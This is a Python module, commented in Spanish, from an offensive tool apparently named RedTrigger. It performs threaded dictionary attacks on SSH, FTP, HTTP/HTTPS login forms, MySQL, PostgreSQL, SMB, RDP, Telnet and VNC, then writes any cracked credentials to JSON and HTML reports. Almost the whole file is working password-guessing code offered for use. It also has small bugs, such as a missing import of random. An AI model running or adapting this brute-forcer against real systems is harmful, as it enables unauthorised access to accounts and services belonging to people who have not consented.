#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
Módulo de ataques de diccionario para RedTrigger
'''

import os
import sys
import time
import json
import socket
import logging
import threading
import itertools
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Importar módulo de utilidades
try:
    from utils import (
        run_command, COLORS, create_dir_if_not_exists, generate_filename,
        save_json, load_json, check_port_status, is_valid_ip, is_valid_port,
        generate_password, calculate_file_hash
    )
except ImportError:
    print("Error: No se pudo importar el módulo de utilidades")
    sys.exit(1)

# Intentar importar módulos necesarios
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False
    print("Advertencia: Paramiko no está instalado. Los ataques SSH estarán limitados.")
    print("Instale paramiko con: pip install paramiko")

try:
    import ftplib
    FTPLIB_AVAILABLE = True
except ImportError:
    FTPLIB_AVAILABLE = False
    print("Advertencia: ftplib no está disponible. Los ataques FTP estarán limitados.")

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("Advertencia: Requests no está instalado. Los ataques HTTP estarán limitados.")
    print("Instale requests con: pip install requests")

try:
    import mysql.connector
    MYSQL_AVAILABLE = True
except ImportError:
    MYSQL_AVAILABLE = False
    print("Advertencia: MySQL Connector no está instalado. Los ataques MySQL estarán limitados.")
    print("Instale mysql-connector-python con: pip install mysql-connector-python")

try:
    import psycopg2
    POSTGRES_AVAILABLE = True
except ImportError:
    POSTGRES_AVAILABLE = False
    print("Advertencia: psycopg2 no está instalado. Los ataques PostgreSQL estarán limitados.")
    print("Instale psycopg2 con: pip install psycopg2-binary")

try:
    import pysmb
    SMB_AVAILABLE = True
except ImportError:
    SMB_AVAILABLE = False
    print("Advertencia: pysmb no está instalado. Los ataques SMB estarán limitados.")
    print("Instale pysmb con: pip install pysmb")

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)

logger = logging.getLogger('redtrigger.dictionary_attack')

# Clase para ataques de diccionario
class DictionaryAttack:
    '''
    Clase para realizar ataques de diccionario contra diferentes servicios
    '''
    def __init__(self, config=None):
        '''
        Inicializa el módulo de ataques de diccionario
        '''
        self.config = config or {}
        self.target = self.config.get('target', None)
        self.port = self.config.get('port', None)
        self.service = self.config.get('service', None)
        self.username = self.config.get('username', None)
        self.username_file = self.config.get('username_file', None)
        self.password = self.config.get('password', None)
        self.password_file = self.config.get('password_file', None)
        self.threads = self.config.get('threads', 5)
        self.timeout = self.config.get('timeout', 5)
        self.delay = self.config.get('delay', 0.1)
        self.output_dir = self.config.get('output_dir', 'results')
        self.verbose = self.config.get('verbose', False)
        
        # Inicializar variables de estado
        self.stop_attack = False
        self.attack_thread = None
        self.credentials_found = []
        self.attempts = 0
        self.start_time = None
        self.end_time = None
        
        # Validar configuración
        if self.service and self.service.lower() not in [
            'ssh', 'ftp', 'http', 'https', 'mysql', 'postgresql', 'smb', 'rdp', 'telnet', 'vnc'
        ]:
            logger.warning(f"Servicio no soportado: {self.service}")
            self.service = None
        
        # Asignar puerto por defecto según el servicio
        if self.service and not self.port:
            default_ports = {
                'ssh': 22,
                'ftp': 21,
                'http': 80,
                'https': 443,
                'mysql': 3306,
                'postgresql': 5432,
                'smb': 445,
                'rdp': 3389,
                'telnet': 23,
                'vnc': 5900
            }
            self.port = default_ports.get(self.service.lower())
    
    def _load_wordlist(self, file_path):
        '''
        Carga una lista de palabras desde un archivo
        '''
        if not file_path or not os.path.isfile(file_path):
            logger.error(f"Archivo no encontrado: {file_path}")
            return []
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.error(f"Error al cargar archivo {file_path}: {str(e)}")
            return []
    
    def _try_ssh_login(self, host, port, username, password):
        '''
        Intenta iniciar sesión en un servidor SSH
        '''
        if not PARAMIKO_AVAILABLE:
            return False
        
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False
            )
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except (paramiko.SSHException, socket.error):
            # Posible bloqueo o límite de conexiones
            time.sleep(self.delay * 2)
            return False
        except Exception as e:
            logger.debug(f"Error SSH ({host}:{port} - {username}): {str(e)}")
            return False
    
    def _try_ftp_login(self, host, port, username, password):
        '''
        Intenta iniciar sesión en un servidor FTP
        '''
        if not FTPLIB_AVAILABLE:
            return False
        
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=self.timeout)
            ftp.login(username, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            return False
        except Exception as e:
            logger.debug(f"Error FTP ({host}:{port} - {username}): {str(e)}")
            return False
    
    def _try_http_login(self, host, port, username, password, is_https=False):
        '''
        Intenta iniciar sesión en un servidor HTTP/HTTPS
        '''
        if not REQUESTS_AVAILABLE:
            return False
        
        protocol = "https" if is_https else "http"
        url = f"{protocol}://{host}:{port}/"
        
        try:
            # Intentar autenticación básica
            response = requests.get(
                url,
                auth=(username, password),
                timeout=self.timeout,
                verify=False
            )
            
            if response.status_code == 200:
                return True
            
            # Intentar autenticación por formulario (genérico)
            login_paths = ["/login", "/admin", "/wp-login.php", "/admin/login"]
            
            for path in login_paths:
                login_url = f"{protocol}://{host}:{port}{path}"
                
                try:
                    # Obtener formulario
                    response = requests.get(login_url, timeout=self.timeout, verify=False)
                    
                    if response.status_code == 200:
                        # Intentar enviar credenciales (genérico)
                        data = {
                            "username": username,
                            "user": username,
                            "log": username,
                            "email": username,
                            "password": password,
                            "pass": password,
                            "pwd": password
                        }
                        
                        response = requests.post(
                            login_url,
                            data=data,
                            timeout=self.timeout,
                            verify=False,
                            allow_redirects=True
                        )
                        
                        # Verificar si el login fue exitoso (genérico)
                        if "logout" in response.text.lower() or "admin" in response.text.lower():
                            return True
                except:
                    continue
            
            return False
        except Exception as e:
            logger.debug(f"Error HTTP ({host}:{port} - {username}): {str(e)}")
            return False
    
    def _try_mysql_login(self, host, port, username, password):
        '''
        Intenta iniciar sesión en un servidor MySQL
        '''
        if not MYSQL_AVAILABLE:
            return False
        
        try:
            conn = mysql.connector.connect(
                host=host,
                port=port,
                user=username,
                password=password,
                connect_timeout=self.timeout
            )
            conn.close()
            return True
        except mysql.connector.Error:
            return False
        except Exception as e:
            logger.debug(f"Error MySQL ({host}:{port} - {username}): {str(e)}")
            return False
    
    def _try_postgresql_login(self, host, port, username, password):
        '''
        Intenta iniciar sesión en un servidor PostgreSQL
        '''
        if not POSTGRES_AVAILABLE:
            return False
        
        try:
            conn = psycopg2.connect(
                host=host,
                port=port,
                user=username,
                password=password,
                connect_timeout=self.timeout
            )
            conn.close()
            return True
        except psycopg2.OperationalError:
            return False
        except Exception as e:
            logger.debug(f"Error PostgreSQL ({host}:{port} - {username}): {str(e)}")
            return False
    
    def _try_smb_login(self, host, port, username, password):
        '''
        Intenta iniciar sesión en un servidor SMB
        '''
        if not SMB_AVAILABLE:
            return False
        
        try:
            from smb.SMBConnection import SMBConnection
            
            conn = SMBConnection(
                username,
                password,
                'RedTrigger',
                host,
                use_ntlm_v2=True
            )
            
            if conn.connect(host, port):
                conn.close()
                return True
            return False
        except Exception as e:
            logger.debug(f"Error SMB ({host}:{port} - {username}): {str(e)}")
            return False
    
    def _try_rdp_login(self, host, port, username, password):
        '''
        Intenta iniciar sesión en un servidor RDP
        '''
        # RDP no tiene una biblioteca Python estándar para autenticación
        # Se utiliza freerdp-x11 o xfreerdp a través de la línea de comandos
        cmd = f"xfreerdp /v:{host}:{port} /u:{username} /p:{password} /cert-ignore /auth-only"
        
        try:
            result = run_command(cmd)
            return "Authentication only, exit status 0" in result
        except Exception as e:
            logger.debug(f"Error RDP ({host}:{port} - {username}): {str(e)}")
            return False
    
    def _try_telnet_login(self, host, port, username, password):
        '''
        Intenta iniciar sesión en un servidor Telnet
        '''
        import telnetlib
        
        try:
            tn = telnetlib.Telnet(host, port, timeout=self.timeout)
            
            # Esperar prompt de usuario
            tn.read_until(b"login: ", timeout=self.timeout)
            tn.write(username.encode('ascii') + b"\n")
            
            # Esperar prompt de contraseña
            tn.read_until(b"Password: ", timeout=self.timeout)
            tn.write(password.encode('ascii') + b"\n")
            
            # Leer respuesta
            response = tn.read_some()
            tn.close()
            
            # Verificar si el login fue exitoso
            return b"incorrect" not in response.lower() and b"failed" not in response.lower()
        except Exception as e:
            logger.debug(f"Error Telnet ({host}:{port} - {username}): {str(e)}")
            return False
    
    def _try_vnc_login(self, host, port, password):
        '''
        Intenta iniciar sesión en un servidor VNC
        '''
        # VNC no tiene una biblioteca Python estándar para autenticación
        # Se utiliza vncviewer a través de la línea de comandos
        cmd = f"vncviewer {host}:{port} -passwd {password} -viewonly"
        
        try:
            result = run_command(cmd)
            return "Authentication successful" in result
        except Exception as e:
            logger.debug(f"Error VNC ({host}:{port}): {str(e)}")
            return False
    
    def _try_login(self, service, host, port, username, password):
        '''
        Intenta iniciar sesión en un servicio específico
        '''
        if not service or not host or not port:
            return False
        
        # Verificar si el puerto está abierto
        if not check_port_status(host, port):
            logger.warning(f"Puerto {port} cerrado en {host}")
            return False
        
        # Intentar login según el servicio
        service = service.lower()
        
        if service == 'ssh':
            return self._try_ssh_login(host, port, username, password)
        elif service == 'ftp':
            return self._try_ftp_login(host, port, username, password)
        elif service == 'http':
            return self._try_http_login(host, port, username, password, is_https=False)
        elif service == 'https':
            return self._try_http_login(host, port, username, password, is_https=True)
        elif service == 'mysql':
            return self._try_mysql_login(host, port, username, password)
        elif service == 'postgresql':
            return self._try_postgresql_login(host, port, username, password)
        elif service == 'smb':
            return self._try_smb_login(host, port, username, password)
        elif service == 'rdp':
            return self._try_rdp_login(host, port, username, password)
        elif service == 'telnet':
            return self._try_telnet_login(host, port, username, password)
        elif service == 'vnc':
            return self._try_vnc_login(host, port, password)  # VNC solo usa contraseña
        else:
            logger.error(f"Servicio no soportado: {service}")
            return False
    
    def _attack_worker(self, service, host, port, username, password):
        '''
        Trabajador para el ataque de diccionario
        '''
        if self.stop_attack:
            return
        
        self.attempts += 1
        
        if self.verbose:
            logger.info(f"Intentando {service}://{username}:{password}@{host}:{port}")
        
        # Intentar login
        if self._try_login(service, host, port, username, password):
            credential = {
                'service': service,
                'host': host,
                'port': port,
                'username': username,
                'password': password,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
            self.credentials_found.append(credential)
            logger.warning(f"Credencial encontrada: {service}://{username}:{password}@{host}:{port}")
            
            # Guardar credencial inmediatamente
            self._save_credential(credential)
        
        # Añadir retraso para evitar bloqueos
        if self.delay > 0:
            time.sleep(self.delay)
    
    def _save_credential(self, credential):
        '''
        Guarda una credencial encontrada
        '''
        if not self.output_dir:
            return
        
        # Crear directorio si no existe
        if not os.path.exists(self.output_dir):
            try:
                os.makedirs(self.output_dir)
            except Exception as e:
                logger.error(f"Error al crear directorio de salida: {str(e)}")
                return
        
        # Generar nombre de archivo
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = os.path.join(
            self.output_dir,
            f"credential_{credential['service']}_{credential['host']}_{timestamp}.json"
        )
        
        # Guardar credencial
        try:
            with open(filename, 'w') as f:
                json.dump(credential, f, indent=4)
            
            logger.info(f"Credencial guardada en {filename}")
        except Exception as e:
            logger.error(f"Error al guardar credencial: {str(e)}")
    
    def start_attack(self, target=None, port=None, service=None, username=None, username_file=None,
                     password=None, password_file=None, threads=None, delay=None):
        '''
        Inicia un ataque de diccionario
        '''
        # Actualizar configuración si se proporcionan parámetros
        if target:
            self.target = target
        if port is not None:
            self.port = port
        if service:
            self.service = service
        if username:
            self.username = username
        if username_file:
            self.username_file = username_file
        if password:
            self.password = password
        if password_file:
            self.password_file = password_file
        if threads is not None:
            self.threads = threads
        if delay is not None:
            self.delay = delay
        
        # Validar configuración
        if not self.target:
            logger.error("No se ha especificado un objetivo")
            return False
        
        if not self.port:
            logger.error("No se ha especificado un puerto")
            return False
        
        if not self.service:
            logger.error("No se ha especificado un servicio")
            return False
        
        if not self.username and not self.username_file:
            logger.error("No se ha especificado un usuario o archivo de usuarios")
            return False
        
        if not self.password and not self.password_file:
            logger.error("No se ha especificado una contraseña o archivo de contraseñas")
            return False
        
        # Validar objetivo
        if not is_valid_ip(self.target) and not self.target.replace('.', '').isalnum():
            logger.error(f"Objetivo no válido: {self.target}")
            return False
        
        # Validar puerto
        if not is_valid_port(self.port):
            logger.error(f"Puerto no válido: {self.port}")
            return False
        
        # Cargar listas de usuarios y contraseñas
        usernames = []
        passwords = []
        
        if self.username:
            usernames = [self.username]
        elif self.username_file:
            usernames = self._load_wordlist(self.username_file)
            if not usernames:
                logger.error(f"No se pudieron cargar usuarios desde {self.username_file}")
                return False
        
        if self.password:
            passwords = [self.password]
        elif self.password_file:
            passwords = self._load_wordlist(self.password_file)
            if not passwords:
                logger.error(f"No se pudieron cargar contraseñas desde {self.password_file}")
                return False
        
        # Reiniciar variables de estado
        self.stop_attack = False
        self.credentials_found = []
        self.attempts = 0
        self.start_time = time.time()
        self.end_time = None
        
        # Crear directorio de salida si no existe
        if self.output_dir and not os.path.exists(self.output_dir):
            try:
                os.makedirs(self.output_dir)
            except Exception as e:
                logger.error(f"Error al crear directorio de salida: {str(e)}")
                return False
        
        # Generar combinaciones de credenciales
        credentials = list(itertools.product(usernames, passwords))
        total_combinations = len(credentials)
        
        logger.info(f"Iniciando ataque de diccionario contra {self.service}://{self.target}:{self.port}")
        logger.info(f"Combinaciones a probar: {total_combinations}")
        
        # Iniciar ataque
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for username, password in credentials:
                if self.stop_attack:
                    break
                
                future = executor.submit(
                    self._attack_worker,
                    self.service,
                    self.target,
                    self.port,
                    username,
                    password
                )
                
                futures.append(future)
            
            # Mostrar progreso
            try:
                completed = 0
                while completed < total_combinations and not self.stop_attack:
                    completed = sum(1 for f in futures if f.done())
                    
                    if total_combinations > 0:
                        progress = completed * 100 / total_combinations
                        elapsed = time.time() - self.start_time
                        rate = completed / elapsed if elapsed > 0 else 0
                        
                        logger.info(f"Progreso: {progress:.1f}% ({completed}/{total_combinations}) - {rate:.1f} intentos/s")
                    
                    time.sleep(2)
            except KeyboardInterrupt:
                logger.info("Ataque interrumpido por el usuario")
                self.stop_attack = True
                executor.shutdown(wait=False)
                return False
        
        # Finalizar ataque
        self.end_time = time.time()
        duration = self.end_time - self.start_time
        
        logger.info(f"Ataque completado en {duration:.2f} segundos")
        logger.info(f"Intentos realizados: {self.attempts}")
        logger.info(f"Credenciales encontradas: {len(self.credentials_found)}")
        
        return True
    
    def stop(self):
        '''
        Detiene el ataque
        '''
        if not self.stop_attack:
            logger.info("Deteniendo ataque...")
            self.stop_attack = True
            return True
        return False
    
    def get_results(self):
        '''
        Obtiene los resultados del ataque
        '''
        duration = 0
        if self.start_time:
            if self.end_time:
                duration = self.end_time - self.start_time
            else:
                duration = time.time() - self.start_time
        
        results = {
            'target': self.target,
            'port': self.port,
            'service': self.service,
            'start_time': datetime.fromtimestamp(self.start_time).strftime('%Y-%m-%d %H:%M:%S') if self.start_time else None,
            'end_time': datetime.fromtimestamp(self.end_time).strftime('%Y-%m-%d %H:%M:%S') if self.end_time else None,
            'duration': duration,
            'attempts': self.attempts,
            'credentials_found': self.credentials_found
        }
        
        return results
    
    def save_results(self, output_file=None):
        '''
        Guarda los resultados del ataque en un archivo JSON
        '''
        if not output_file:
            # Generar nombre de archivo por defecto
            if not self.output_dir:
                self.output_dir = 'results'
            
            if not os.path.exists(self.output_dir):
                try:
                    os.makedirs(self.output_dir)
                except Exception as e:
                    logger.error(f"Error al crear directorio de salida: {str(e)}")
                    return False
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = os.path.join(
                self.output_dir,
                f"dictionary_attack_{self.service}_{self.target}_{timestamp}.json"
            )
        
        # Obtener resultados
        results = self.get_results()
        
        # Guardar resultados
        try:
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=4)
            
            logger.info(f"Resultados guardados en {output_file}")
            return True
        except Exception as e:
            logger.error(f"Error al guardar resultados: {str(e)}")
            return False
    
    def generate_report(self, output_file=None, format='txt'):
        '''
        Genera un informe del ataque
        '''
        if not output_file:
            # Generar nombre de archivo por defecto
            if not self.output_dir:
                self.output_dir = 'results'
            
            if not os.path.exists(self.output_dir):
                try:
                    os.makedirs(self.output_dir)
                except Exception as e:
                    logger.error(f"Error al crear directorio de salida: {str(e)}")
                    return False
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = os.path.join(
                self.output_dir,
                f"dictionary_attack_report_{self.service}_{self.target}_{timestamp}.{format}"
            )
        
        # Obtener resultados
        results = self.get_results()
        
        try:
            if format.lower() == 'txt':
                with open(output_file, 'w') as f:
                    f.write("=== INFORME DE ATAQUE DE DICCIONARIO ===\n\n")
                    f.write(f"Objetivo: {results['target']}\n")
                    f.write(f"Puerto: {results['port']}\n")
                    f.write(f"Servicio: {results['service']}\n")
                    f.write(f"Inicio: {results['start_time']}\n")
                    f.write(f"Fin: {results['end_time']}\n")
                    f.write(f"Duración: {results['duration']:.2f} segundos\n")
                    f.write(f"Intentos realizados: {results['attempts']}\n\n")
                    
                    f.write("--- CREDENCIALES ENCONTRADAS ---\n")
                    if results['credentials_found']:
                        for i, cred in enumerate(results['credentials_found'], 1):
                            f.write(f"[{i}] {cred['service']}://{cred['username']}:{cred['password']}@{cred['host']}:{cred['port']}\n")
                            f.write(f"    Encontrada: {cred['timestamp']}\n\n")
                    else:
                        f.write("No se encontraron credenciales\n")
                    
                    f.write("\n=== FIN DEL INFORME ===\n")
            elif format.lower() == 'html':
                with open(output_file, 'w') as f:
                    f.write("<!DOCTYPE html>\n")
                    f.write("<html>\n")
                    f.write("<head>\n")
                    f.write("    <title>Informe de Ataque de Diccionario</title>\n")
                    f.write("    <style>\n")
                    f.write("        body { font-family: Arial, sans-serif; margin: 20px; }\n")
                    f.write("        h1 { color: #2c3e50; }\n")
                    f.write("        h2 { color: #3498db; margin-top: 20px; }\n")
                    f.write("        table { border-collapse: collapse; width: 100%; margin-top: 10px; }\n")
                    f.write("        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }\n")
                    f.write("        th { background-color: #f2f2f2; }\n")
                    f.write("        .success { background-color: #d4edda; color: #155724; }\n")
                    f.write("    </style>\n")
                    f.write("</head>\n")
                    f.write("<body>\n")
                    
                    f.write("    <h1>Informe de Ataque de Diccionario</h1>\n")
                    f.write("    <p><strong>Objetivo:</strong> " + results['target'] + "</p>\n")
                    f.write("    <p><strong>Puerto:</strong> " + str(results['port']) + "</p>\n")
                    f.write("    <p><strong>Servicio:</strong> " + results['service'] + "</p>\n")
                    f.write("    <p><strong>Inicio:</strong> " + (results['start_time'] or 'N/A') + "</p>\n")
                    f.write("    <p><strong>Fin:</strong> " + (results['end_time'] or 'N/A') + "</p>\n")
                    f.write(f"    <p><strong>Duración:</strong> {results['duration']:.2f} segundos</p>\n")
                    f.write(f"    <p><strong>Intentos realizados:</strong> {results['attempts']}</p>\n")
                    
                    f.write("    <h2>Credenciales Encontradas</h2>\n")
                    if results['credentials_found']:
                        f.write("    <table>\n")
                        f.write("        <tr>\n")
                        f.write("            <th>#</th>\n")
                        f.write("            <th>Servicio</th>\n")
                        f.write("            <th>Host</th>\n")
                        f.write("            <th>Puerto</th>\n")
                        f.write("            <th>Usuario</th>\n")
                        f.write("            <th>Contraseña</th>\n")
                        f.write("            <th>Timestamp</th>\n")
                        f.write("        </tr>\n")
                        
                        for i, cred in enumerate(results['credentials_found'], 1):
                            f.write("        <tr class=\"success\">\n")
                            f.write(f"            <td>{i}</td>\n")
                            f.write(f"            <td>{cred['service']}</td>\n")
                            f.write(f"            <td>{cred['host']}</td>\n")
                            f.write(f"            <td>{cred['port']}</td>\n")
                            f.write(f"            <td>{cred['username']}</td>\n")
                            f.write(f"            <td>{cred['password']}</td>\n")
                            f.write(f"            <td>{cred['timestamp']}</td>\n")
                            f.write("        </tr>\n")
                        
                        f.write("    </table>\n")
                    else:
                        f.write("    <p>No se encontraron credenciales</p>\n")
                    
                    f.write("</body>\n")
                    f.write("</html>\n")
            else:
                logger.error(f"Formato de informe no soportado: {format}")
                return False
            
            logger.info(f"Informe generado en {output_file}")
            return True
        except Exception as e:
            logger.error(f"Error al generar informe: {str(e)}")
            return False

# Función para realizar un ataque de diccionario
def dictionary_attack(target, port, service, username=None, username_file=None,
                     password=None, password_file=None, threads=5, delay=0.1, output_dir=None):
    '''
    Realiza un ataque de diccionario contra un servicio específico
    '''
    # Validar parámetros
    if not target or not port or not service:
        logger.error("Faltan parámetros obligatorios (target, port, service)")
        return None
    
    if not username and not username_file:
        logger.error("Se debe especificar un usuario o un archivo de usuarios")
        return None
    
    if not password and not password_file:
        logger.error("Se debe especificar una contraseña o un archivo de contraseñas")
        return None
    
    # Configurar ataque
    attack = DictionaryAttack({
        'target': target,
        'port': port,
        'service': service,
        'username': username,
        'username_file': username_file,
        'password': password,
        'password_file': password_file,
        'threads': threads,
        'delay': delay,
        'output_dir': output_dir or 'results',
        'verbose': True
    })
    
    # Iniciar ataque
    success = attack.start_attack()
    if not success:
        logger.error("Error al realizar el ataque")
        return None
    
    # Obtener resultados
    results = attack.get_results()
    
    # Guardar resultados
    attack.save_results()
    
    # Generar informe
    attack.generate_report(format='html')
    
    return results

# Función para generar una lista de contraseñas
def generate_wordlist(output_file, length_min=6, length_max=10, charset='alphanum',
                     prefix=None, suffix=None, count=1000):
    '''
    Genera una lista de contraseñas
    '''
    if not output_file:
        logger.error("No se ha especificado un archivo de salida")
        return False
    
    # Validar parámetros
    if length_min < 1 or length_max < length_min:
        logger.error("Longitudes no válidas")
        return False
    
    if count < 1:
        logger.error("Cantidad no válida")
        return False
    
    # Definir conjunto de caracteres
    charsets = {
        'alpha': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
        'alphanum': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
        'alphanum_special': 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?',
        'digits': '0123456789',
        'hex': '0123456789abcdef',
        'lower': 'abcdefghijklmnopqrstuvwxyz',
        'lower_digits': 'abcdefghijklmnopqrstuvwxyz0123456789',
        'upper': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
        'upper_digits': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    }
    
    chars = charsets.get(charset, charsets['alphanum'])
    
    # Generar contraseñas
    try:
        with open(output_file, 'w') as f:
            for _ in range(count):
                length = random.randint(length_min, length_max)
                password = generate_password(length, chars)
                
                if prefix:
                    password = prefix + password
                
                if suffix:
                    password = password + suffix
                
                f.write(password + '\n')
        
        logger.info(f"Lista de contraseñas generada en {output_file}")
        return True
    except Exception as e:
        logger.error(f"Error al generar lista de contraseñas: {str(e)}")
        return False

# Función principal para pruebas
def main():
    print(f"{COLORS['HEADER']}Módulo de ataques de diccionario para RedTrigger{COLORS['ENDC']}")
    
    # Solicitar parámetros
    target = input(f"{COLORS['BOLD']}Ingrese el objetivo (IP o dominio): {COLORS['ENDC']}")
    if not target:
        print(f"{COLORS['FAIL']}Objetivo no válido{COLORS['ENDC']}")
        return
    
    port = input(f"{COLORS['BOLD']}Ingrese el puerto: {COLORS['ENDC']}")
    try:
        port = int(port)
        if port < 1 or port > 65535:
            print(f"{COLORS['FAIL']}Puerto no válido{COLORS['ENDC']}")
            return
    except:
        print(f"{COLORS['FAIL']}Puerto no válido{COLORS['ENDC']}")
        return
    
    print(f"\n{COLORS['BOLD']}Servicios disponibles:{COLORS['ENDC']}")
    print("1. SSH")
    print("2. FTP")
    print("3. HTTP")
    print("4. HTTPS")
    print("5. MySQL")
    print("6. PostgreSQL")
    print("7. SMB")
    print("8. RDP")
    print("9. Telnet")
    print("10. VNC")
    
    service_option = input(f"\n{COLORS['BOLD']}Seleccione un servicio (1-10): {COLORS['ENDC']}")
    services = ['ssh', 'ftp', 'http', 'https', 'mysql', 'postgresql', 'smb', 'rdp', 'telnet', 'vnc']
    
    try:
        service_index = int(service_option) - 1
        if service_index < 0 or service_index >= len(services):
            print(f"{COLORS['FAIL']}Opción no válida{COLORS['ENDC']}")
            return
        
        service = services[service_index]
    except:
        print(f"{COLORS['FAIL']}Opción no válida{COLORS['ENDC']}")
        return
    
    # Solicitar credenciales
    print(f"\n{COLORS['BOLD']}Opciones de usuario:{COLORS['ENDC']}")
    print("1. Usuario único")
    print("2. Lista de usuarios")
    
    user_option = input(f"\n{COLORS['BOLD']}Seleccione una opción (1-2): {COLORS['ENDC']}")
    
    username = None
    username_file = None
    
    if user_option == '1':
        username = input(f"{COLORS['BOLD']}Ingrese el usuario: {COLORS['ENDC']}")
        if not username:
            print(f"{COLORS['FAIL']}Usuario no válido{COLORS['ENDC']}")
            return
    elif user_option == '2':
        username_file = input(f"{COLORS['BOLD']}Ingrese la ruta del archivo de usuarios: {COLORS['ENDC']}")
        if not os.path.isfile(username_file):
            print(f"{COLORS['FAIL']}Archivo no encontrado{COLORS['ENDC']}")
            return
    else:
        print(f"{COLORS['FAIL']}Opción no válida{COLORS['ENDC']}")
        return
    
    print(f"\n{COLORS['BOLD']}Opciones de contraseña:{COLORS['ENDC']}")
    print("1. Contraseña única")
    print("2. Lista de contraseñas")
    
    pass_option = input(f"\n{COLORS['BOLD']}Seleccione una opción (1-2): {COLORS['ENDC']}")
    
    password = None
    password_file = None
    
    if pass_option == '1':
        password = input(f"{COLORS['BOLD']}Ingrese la contraseña: {COLORS['ENDC']}")
        if not password:
            print(f"{COLORS['FAIL']}Contraseña no válida{COLORS['ENDC']}")
            return
    elif pass_option == '2':
        password_file = input(f"{COLORS['BOLD']}Ingrese la ruta del archivo de contraseñas: {COLORS['ENDC']}")
        if not os.path.isfile(password_file):
            print(f"{COLORS['FAIL']}Archivo no encontrado{COLORS['ENDC']}")
            return
    else:
        print(f"{COLORS['FAIL']}Opción no válida{COLORS['ENDC']}")
        return
    
    # Configurar opciones adicionales
    threads = input(f"{COLORS['BOLD']}Número de hilos (1-20, por defecto 5): {COLORS['ENDC']}") or "5"
    delay = input(f"{COLORS['BOLD']}Retraso entre intentos en segundos (por defecto 0.1): {COLORS['ENDC']}") or "0.1"
    
    try:
        threads = int(threads)
        if threads < 1 or threads > 20:
            print(f"{COLORS['WARNING']}Número de hilos no válido, usando valor por defecto (5){COLORS['ENDC']}")
            threads = 5
        
        delay = float(delay)
        if delay < 0:
            print(f"{COLORS['WARNING']}Retraso no válido, usando valor por defecto (0.1){COLORS['ENDC']}")
            delay = 0.1
    except:
        print(f"{COLORS['WARNING']}Valores no válidos, usando valores por defecto{COLORS['ENDC']}")
        threads = 5
        delay = 0.1
    
    # Crear directorio de resultados
    output_dir = 'results'
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    # Iniciar ataque
    print(f"\n{COLORS['GREEN']}Iniciando ataque contra {service}://{target}:{port}{COLORS['ENDC']}")
    print("Esto puede tardar varios minutos dependiendo de la cantidad de combinaciones...")
    print("Presione Ctrl+C para cancelar el ataque")
    
    try:
        results = dictionary_attack(
            target=target,
            port=port,
            service=service,
            username=username,
            username_file=username_file,
            password=password,
            password_file=password_file,
            threads=threads,
            delay=delay,
            output_dir=output_dir
        )
        
        if results:
            # Mostrar resultados
            print(f"\n{COLORS['BLUE']}Ataque completado{COLORS['ENDC']}")
            print(f"Intentos realizados: {results['attempts']}")
            print(f"Credenciales encontradas: {len(results['credentials_found'])}")
            
            if results['credentials_found']:
                print(f"\n{COLORS['GREEN']}Credenciales encontradas:{COLORS['ENDC']}")
                for i, cred in enumerate(results['credentials_found'], 1):
                    print(f"  {i}. {cred['service']}://{cred['username']}:{cred['password']}@{cred['host']}:{cred['port']}")
            
            # Mostrar ruta de los informes
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            json_file = os.path.join(output_dir, f"dictionary_attack_{service}_{target}_{timestamp}.json")
            html_file = os.path.join(output_dir, f"dictionary_attack_report_{service}_{target}_{timestamp}.html")
            
            print(f"\n{COLORS['GREEN']}Informes generados:{COLORS['ENDC']}")
            print(f"  - JSON: {json_file}")
            print(f"  - HTML: {html_file}")
    except KeyboardInterrupt:
        print(f"\n{COLORS['WARNING']}Ataque cancelado por el usuario{COLORS['ENDC']}")
    except Exception as e:
        print(f"\n{COLORS['FAIL']}Error durante el ataque: {str(e)}{COLORS['ENDC']}")

if __name__ == '__main__':
    main()